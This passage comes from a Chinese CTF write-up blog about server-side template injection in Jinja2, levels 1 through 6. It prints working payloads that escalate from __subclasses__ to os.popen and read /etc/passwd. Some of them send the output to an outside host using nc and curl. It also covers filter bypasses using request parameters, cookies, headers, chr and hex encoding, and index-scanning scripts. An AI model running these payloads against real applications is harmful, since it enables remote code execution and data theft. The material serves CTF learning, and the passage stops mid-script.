class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#以下是 Python 3.x 版本中的所有内置函数的列表：</span><br><br><span class="hljs-built_in">abs</span>()<br><span class="hljs-built_in">all</span>()<br><span class="hljs-built_in">any</span>()<br><span class="hljs-built_in">ascii</span>()<br><span class="hljs-built_in">bin</span>()<br><span class="hljs-built_in">bool</span>()<br><span class="hljs-built_in">breakpoint</span>()<br><span class="hljs-built_in">bytearray</span>()<br><span class="hljs-built_in">bytes</span>()<br><span class="hljs-built_in">callable</span>()<br><span class="hljs-built_in">chr</span>()<br><span class="hljs-built_in">classmethod</span>()<br><span class="hljs-built_in">compile</span>()<br><span class="hljs-built_in">complex</span>()<br><span class="hljs-built_in">delattr</span>()<br><span class="hljs-built_in">dict</span>()<br><span class="hljs-built_in">dir</span>()<br><span class="hljs-built_in">divmod</span>()<br><span class="hljs-built_in">enumerate</span>()<br><span class="hljs-built_in">eval</span>()<span class="hljs-comment">####this</span><br><span class="hljs-built_in">exec</span>()<span class="hljs-comment">####and this</span><br><span class="hljs-comment">#上面两个能够执行任意python代码，当然也就能导入os库，调用系统命令</span><br><span class="hljs-built_in">filter</span>()<br><span class="hljs-built_in">float</span>()<br><span class="hljs-built_in">format</span>()<br><span class="hljs-built_in">frozenset</span>()<br><span class="hljs-built_in">getattr</span>()<br><span class="hljs-built_in">globals</span>()<br><span class="hljs-built_in">hasattr</span>()<br><span class="hljs-built_in">hash</span>()<br><span class="hljs-built_in">help</span>()<br><span class="hljs-built_in">hex</span>()<br><span class="hljs-built_in">id</span>()<br><span class="hljs-built_in">input</span>()<br><span class="hljs-built_in">int</span>()<br><span class="hljs-built_in">isinstance</span>()<br><span class="hljs-built_in">issubclass</span>()<br><span class="hljs-built_in">iter</span>()<br><span class="hljs-built_in">len</span>()<br><span class="hljs-built_in">list</span>()<br><span class="hljs-built_in">locals</span>()<br><span class="hljs-built_in">map</span>()<br><span class="hljs-built_in">max</span>()<br><span class="hljs-built_in">memoryview</span>()<br><span class="hljs-built_in">min</span>()<br><span class="hljs-built_in">next</span>()<br><span class="hljs-built_in">object</span>()<br><span class="hljs-built_in">oct</span>()<br><span class="hljs-built_in">open</span>()<br><span class="hljs-built_in">ord</span>()<br><span class="hljs-built_in">pow</span>()<br><span class="hljs-built_in">print</span>()<br><span class="hljs-built_in">property</span>()<br><span class="hljs-built_in">range</span>()<br><span class="hljs-built_in">repr</span>()<br><span class="hljs-built_in">reversed</span>()<br><span class="hljs-built_in">round</span>()<br><span class="hljs-built_in">set</span>()<br><span class="hljs-built_in">setattr</span>()<br><span class="hljs-built_in">slice</span>()<br><span class="hljs-built_in">sorted</span>()<br><span class="hljs-built_in">staticmethod</span>()<br><span class="hljs-built_in">str</span>()<br><span class="hljs-built_in">sum</span>()<br><span class="hljs-built_in">super</span>()<br><span class="hljs-built_in">tuple</span>()<br><span class="hljs-built_in">type</span>()<br><span class="hljs-built_in">vars</span>()<br><span class="hljs-built_in">zip</span>()<br><span class="hljs-keyword">import</span>()<br></code></pre></td></tr></table></figure><p><code>__builtins__</code>：在python中，<code>__builtins__</code>是一个特殊模块，它包含了python内置的所有函数、异常对象。以一个集合的形式查看其引用，<code>__builtins__</code> 方法是做为默认初始模块出现的，可用于查看当前所有导入的内建函数。</p><p><code>__globals__</code> 是一个函数对象特有的属性，它是一个字典，记录了该函数所在文件中的全局变量的值。当函数被定义时，它会捕获所在文件的全局命名空间（global namespace），包括所有的全局变量。这些全局变量的值会被保存在 <code>__globals__</code> 属性所指向的字典中。在 Python 中，每个函数都有一个 <code>__globals__</code> 属性，它指向一个字典，包含函数所在文件的全局变量。这使得函数可以在执行时访问其所在文件的全局变量，即使它们定义在函数之外。</p><p><code>__import__()</code>：该方法用于动态加载类和函数 。如果一个模块经常变化就可以使用 <code>__import__()</code> 来动态载入，就是 <code>import</code>。语法：<code>__import__(模块名)</code></p><p><code>__init__</code>：构造函数，实例化类时自动调用</p><p>有要注意的点：</p><p>从上面的内建函数列表可以找到eval和exec这俩函数，</p><p>写脚本找有这俩函数的子类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> html<span class="hljs-comment">#这里引入了html库是针对本题，运行返回网页内容是html实体，所以人为解码</span><br><br>url = <span class="hljs-string">&#x27;http://124.70.99.199:5003/level/1&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">500</span>):<br>    payload = <span class="hljs-string">&quot;&quot;&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[%s].__init__.__globals__.__builtins__&#125;&#125;&quot;&quot;&quot;</span>%i<br>    evalClass = <span class="hljs-string">&quot;&quot;&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[%s]&#125;&#125;&quot;&quot;&quot;</span>%i<br>    r = requests.post(url,data=&#123;<span class="hljs-string">&quot;code&quot;</span>:payload&#125;).text<br>    evalclass_r = requests.post(url,data=&#123;<span class="hljs-string">&quot;code&quot;</span>:evalClass&#125;).text<br>    r = html.unescape(r)<br>    evalclass_r = html.unescape(evalclass_r)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;eval&quot;</span> <span class="hljs-keyword">in</span> r:<br><br>        <span class="hljs-built_in">print</span>(i,end=<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(evalclass_r)<br>        <br></code></pre></td></tr></table></figure><p>这里符合条件的子类也是相当多</p><p><img src="/2023/02/09/ssti/image-20230731005556778.png"></p><p>相当多，我们随便取个数继续构造payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">399</span>].__init__.__globals__.__builtins__[<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure><p>后面发现不一定要使用<code>__builtins__</code>模块，还可以试试别的模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># __builtins__</span><br>&#123;&#123;().__class__.__base__.__subclasses__()[<span class="hljs-number">80</span>].__init__.__globals__.__builtins__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;<br><span class="hljs-comment"># popen</span><br>&#123;&#123;().__class__.__base__.__subclasses__()[<span class="hljs-number">132</span>].__init__.__globals__[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;<br><span class="hljs-comment"># os</span><br>&#123;&#123;().__class__.__base__.__subclasses__()[<span class="hljs-number">213</span>].__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;cat flag&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/ssti/image-20230731012232999.png"></p><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>被警告了</p><p><img src="/2023/02/09/ssti/image-20230731021637628.png"></p><p>这样又没事</p><p><img src="/2023/02/09/ssti/image-20230731021730919.png"></p><p>这样也可</p><p><img src="/2023/02/09/ssti/image-20230731021752614.png"></p><p>左双括号被ban了</p><p><img src="/2023/02/09/ssti/image-20230731021832024.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;% ... %&#125; for Statements <br><br>&#123;&#123; ... &#125;&#125; for Expressions to print to the template output<br><br>&#123;# ... #&#125; for Comments not included in the template output<br><br>#  ... # for Line Statements<br></code></pre></td></tr></table></figure><p>jinja2模板语法中可不止<code>&#123;&#123;&#125;&#125;</code>，还有<code>&#123;%%&#125;</code>，用于插入逻辑控制代码，<em><strong>其中的代码会在渲染模板时被执行</strong></em>，</p><p>在 Jinja2 模板引擎中，<code>&#123;%%&#125;</code> 中的控制结构包括以下几种，和解题没关系的也顺便加下，多学百益无一害：</p><ol><li><code>&#123;% if ... %&#125;` 和 `&#123;% endif %&#125;</code>：条件语句，用于根据条件执行不同的代码块。</li><li><code>&#123;% for ... %&#125;` 和 `&#123;% endfor %&#125;</code>：循环语句，用于遍历一个可迭代对象的元素。</li><li><code>&#123;% while ... %&#125;` 和 `&#123;% endwhile %&#125;</code>：循环语句，用于根据条件循环执行代码块。</li><li><code>&#123;% else %&#125;</code>：与 if 或 for 配合使用，在没有满足条件或循环结束时执行的代码块。</li><li><code>&#123;% elif ... %&#125;</code>：与 if 配合使用，用于添加额外的条件分支。</li><li><code>&#123;% set ... %&#125;</code>：变量赋值语句，用于在模板中定义变量。</li><li><code>&#123;% macro ... %&#125;` 和 `&#123;% endmacro %&#125;</code>：宏定义，用于在模板中定义可复用的代码片段。</li><li><code>&#123;% call ... %&#125;` 和 `&#123;% endcall %&#125;</code>：调用宏，用于调用已定义的宏。</li><li><code>&#123;% block ... %&#125;` 和 `&#123;% endblock %&#125;</code>：块定义，用于在模板继承中重写内容。</li><li><code>&#123;% extends ... %&#125;</code>：模板继承，用于继承其他模板，并重写其中的块内容。</li><li><code>&#123;%include ... %&#125;</code>：引入外部模板</li></ol><p>陌生的那些用一个例子说明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;&#123;&#123; title &#125;&#125;&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &#123;% if user %&#125;<br>        &lt;h1&gt;Hello, &#123;&#123; user &#125;&#125;!&lt;/h1&gt;<br>    &#123;% else %&#125;<br>        &lt;h1&gt;Hello, Guest!&lt;/h1&gt;<br>    &#123;% endif %&#125;<br><br>    &#123;% macro format_name(first, last) %&#125;<br>        &#123;&#123; first &#125;&#125; &#123;&#123; last &#125;&#125;<br>    &#123;% endmacro %&#125;<br><br>    &lt;p&gt;Full Name: &#123;&#123; format_name(&#x27;John&#x27;, &#x27;Doe&#x27;) &#125;&#125;&lt;/p&gt;<br>    <br>    &#123;% macro greet(name) %&#125;<br>    &lt;h1&gt;Hello,&#123;&#123;name&#125;&#125;!&lt;/h1&gt;<br>    &#123;%endmacro%&#125;<br>    <br>    &#123;% call greet(&#x27;Jhon&#x27;) %&#125;<br>    &#123;% call greet(&#x27;Alice&#x27;) %&#125;<br><br>    &#123;% block content %&#125;<br>        &lt;p&gt;This is the default content.&lt;/p&gt;<br>    &#123;% endblock %&#125;<br><br>    &#123;% include &#x27;footer.html&#x27; %&#125;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>while，set:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;While Loop Example&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &#123;% set counter = 1 %&#125;<br>    &lt;ul&gt;<br>        &#123;% while counter &lt;= 5 %&#125;<br>            &lt;li&gt;Item &#123;&#123; counter &#125;&#125;&lt;/li&gt;<br>            &#123;% set counter = counter + 1 %&#125;&lt;!--注意这里要用set--&gt;<br>        &#123;% endwhile %&#125;<br>    &lt;/ul&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>最后构造payload，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">/*逻辑语句会执行，但是不输出，因此需要回带到自己vps*/<br>&#123;%if (&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[399].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd|nc 124.70.99.199 7890&#x27;).read()&quot;))%&#125;&#123;%endif%&#125;//nc实现回带<br>&#123;%if (&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[399].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;curl http://124.70.99.199:7890/?`cat /etc/passwd`&#x27;).read()&quot;))%&#125;&#123;%endif%&#125;//curl实现回带<br><br><br>&#123;%for i in (&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[399].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd|nc 124.70.99.199 7890&#x27;).read()&quot;))%&#125;&#123;%endfor%&#125;//curl实现同上<br><br>/*感觉可能的实现方式都试了一遍，最后发现set也可*/<br>&#123;%set a = (&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[399].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd|nc 124.70.99.199 7890&#x27;).read()&quot;))%&#125;<br></code></pre></td></tr></table></figure><p>看别人博客时发现print居然也能写进来诶，自己想了想，既然能够执行为啥不能用print呢，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%print(&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[399].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&quot;))%&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/ssti/image-20230731025126135.png"></p><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>emmm，上面出了点小趣事，涉及到jinja2的渲染语句还是都打上代码块吧呜呜（，传博客的时候发现报错</p><p><img src="/2023/02/09/ssti/image-20230731024741335.png"></p><p>，小问题，都打上代码块就好了</p><p>输入1，</p><p><img src="/2023/02/09/ssti/image-20230731030014042.png"></p><p><img src="/2023/02/09/ssti/image-20230731030026544.png"></p><p>只会显示语法正确与否，不会回显，那好办，上一题回带vps的payload直接拿下来用，</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%if (&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[399].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd|nc 124.70.99.199 7890&#x27;).read()&quot;))%&#125;&#123;%endif%&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/ssti/image-20230731025728066.png"></p><p>还看到了别人的姿势，</p><p><img src="/2023/02/09/ssti/image-20230731030517813.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;% for i in &#x27;&#x27;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if i.__name__==&#x27;Popen&#x27; %&#125;&#123;&#123; i.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /etc/passwd|nc 124.70.99.199 7890&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>中括号被过滤了，<a href="https://jinja.palletsprojects.com/en/3.1.x/templates/#variables">查Jinja官方文档</a>，variable开头就直接说了</p><p><img src="/2023/02/09/ssti/image-20230731170423110.png"></p><p>你可以使用点（ <code>.</code> ）来访问变量的属性，作为替代，也可以使用所谓的“下标”语 法（<code>[]</code>），如果点被过滤，可以用中括号绕过。</p><p>中括号被过滤了呢，这里的代码写出了一种特殊的方法<code>__getitem__</code>，用于获取foo中的item</p><p><img src="/2023/02/09/ssti/image-20230731180156155.png">我们可以用<code>__getitem__()</code>来获取字典中的键值，看了别人的博客，知道pop()方法也可以取键值，但是会删除键，不到万不得已不要用</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(399).__init__.__globals__.__builtins__.__getitem__(&quot;__import__&quot;)(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;<br><br>&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().pop(399).__init__.__globals__.__builtins__.pop(&quot;__import__&quot;)(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;<br><br>&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(399).__init__.__globals__.get(&#x27;__builtins__&#x27;).__getitem__(&quot;__import__&quot;)(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125; ##get()返回指定键的值，如果值不在字典中返回default值<br><br>&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(399).__init__.__globals__.setdefault(&#x27;__builtins__&#x27;).__getitem__(&quot;__import__&quot;)(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;  ##setdefault(),和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default<br></code></pre></td></tr></table></figure><h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>单双引号被过滤</p><p><img src="/2023/02/09/ssti/image-20230731183825048.png"></p><p>这个是真不会，去网上找别人的题解</p><p>引号过滤有主要两种绕过方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">#方法一：request对象(jinja2)<br>&#123;&#123;1.__class__.__base__.__subclasses__()[64].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).popen(request.args.arg3).read()&#125;&#125;<br>#然后GET传递a，b，c参数用于替代引号内的几样字符串<br>#?a=__import__&amp;b=os&amp;c=cat /etc/passwd<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/ssti/image-20230801020731807.png"></p><p><code>request.values</code>返回无论是GET还是POST请求的参数，当然flak框架内支持<code>request.form</code>用于传递post参数</p><p><img src="/2023/02/09/ssti/image-20230801021306517.png"></p><p><img src="/2023/02/09/ssti/image-20230801021603150.png"></p><p>cookie中传参也可以</p><p><img src="/2023/02/09/ssti/image-20230801021808956.png"></p><p>举一反三，看到别人的博客cookie可以塞，ua头里是不是也可以塞？去学了下jinja2获取ua头的方式(用法<code>request.user_agent.string</code>获取用户完整的ua字符串，<code>request.user_agent.browser</code>获取浏览器信息，<code>request.user_agent.platform</code>获取操作系统信息)，还真行</p><p><img src="/2023/02/09/ssti/image-20230801023029680.png"></p><p>那自己创一个请求头也可以喽？还真行，真有意思</p><p><img src="/2023/02/09/ssti/image-20230801023528609.png"></p><p>第二种方法，chr方法的利用，与python的chr()函数类似，用于将unicode编码转为对应字符，因为我们没法直接使用chr函数，所以需要通过<code>__builtins__</code>找到他，然后在<code>&#123;%%&#125;</code>中设置变量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> html<span class="hljs-comment">#这里引入了html库是针对本题，运行返回网页内容是html实体，所以人为解码</span><br><br>url = <span class="hljs-string">&#x27;http://124.70.99.199:5003/level/1&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">500</span>):<br>    payload = <span class="hljs-string">&quot;&quot;&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(%s).__init__.__globals__.__builtins__&#125;&#125;&quot;&quot;&quot;</span>%i<br>    evalClass = <span class="hljs-string">&quot;&quot;&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(%s)&#125;&#125;&quot;&quot;&quot;</span>%i<br>    r = requests.post(url,data=&#123;<span class="hljs-string">&quot;code&quot;</span>:payload&#125;).text<br>    evalclass_r = requests.post(url,data=&#123;<span class="hljs-string">&quot;code&quot;</span>:evalClass&#125;).text<br>    r = html.unescape(r)<br>    evalclass_r = html.unescape(evalclass_r)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;chr&quot;</span> <span class="hljs-keyword">in</span> r:<br><br>        <span class="hljs-built_in">print</span>(i,end=<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(evalclass_r)<br>        <br>  <span class="hljs-comment">#找到chr在第64个子类里</span><br></code></pre></td></tr></table></figure><p><code>&#123;&#123;chr(65)&#125;&#125;</code>将渲染为‘A’，如下图</p><p><img src="/2023/02/09/ssti/image-20230801030534571.png"></p><p>%2b(‘+’)用于连接两个字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set chr=1.__class__.__base__.__subclasses__()[64].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;1.__class__.__base__.__subclasses__()[64].__init__.__globals__.__builtins__[chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)](chr(111)%2bchr(115)).popen(chr(108)%2bchr(115)).read()&#125;&#125;<br>#等价于<br>&#123;%set chr=1.__class__.__base__.__subclasses__()[64].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;1.__class__.__base__.__subclasses__()[64].__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;<br>#这里一定注意import两端的下划线呜呜呜呜，忘记了这个模块有下划线，然后又是全都是ascii码好久都没发现<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/ssti/image-20230801034608529.png"></p><p>这样挨个对ascii码太麻烦了，写个python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;cat /etc/passwd&quot;</span><br><span class="hljs-keyword">for</span> index,char <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-built_in">str</span>):<br>    joinchr = <span class="hljs-string">&#x27;%2b&#x27;</span> <span class="hljs-keyword">if</span> index &lt; <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)-<span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;chr(&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">ord</span>(char)),end=joinchr)<br>    <br><span class="hljs-comment">#output:chr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)</span><br><br></code></pre></td></tr></table></figure><p>写脚本的时候再学点python新知识,<code>enumerate()</code>函数，用于将一个可迭代对象(列表、元组、字符串等)转化为枚举对象，枚举对象可提供迭代对象的元素及其索引，有点像<code>foreach as</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">fruits = [<span class="hljs-string">&#x27;apple&#x27;</span>, <span class="hljs-string">&#x27;banana&#x27;</span>, <span class="hljs-string">&#x27;orange&#x27;</span>]<br><span class="hljs-keyword">for</span> index, fruit <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(fruits):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Index <span class="hljs-subst">&#123;index&#125;</span>: <span class="hljs-subst">&#123;fruit&#125;</span>&quot;</span>)<br>    <br><span class="hljs-comment">#output:Index 0: apple</span><br><span class="hljs-comment">#Index 1: banana</span><br><span class="hljs-comment">#Index 2: orange</span><br></code></pre></td></tr></table></figure><h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p>下划线被过滤了，受上一题的启发，试试request，诶嘿，可行，这里不要用点来取值，用中括号，用点的话逻辑关系全乱了</p><p><img src="/2023/02/09/ssti/image-20230801042557864.png"></p><p>好玩</p><p><img src="/2023/02/09/ssti/image-20230801042414133.png"></p><p>去网上看了看，还有别的绕过姿势，编码绕过</p><p>十六进制编码绕过：</p><p>对’_’hex编码，是5f，写作转义序列，\x5f</p><p><img src="/2023/02/09/ssti/image-20230801171743303.png"></p><p>一个一个下划线转太麻烦，这里用python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">string = <span class="hljs-string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(64).__init__.__globals__.__builtins__&#125;&#125;&quot;</span><br><br>string = string.replace(<span class="hljs-string">&#x27;_&#x27;</span>,(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;_&#x27;</span>))))<br>string = string.replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;\\x&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(string)<br><br><br><span 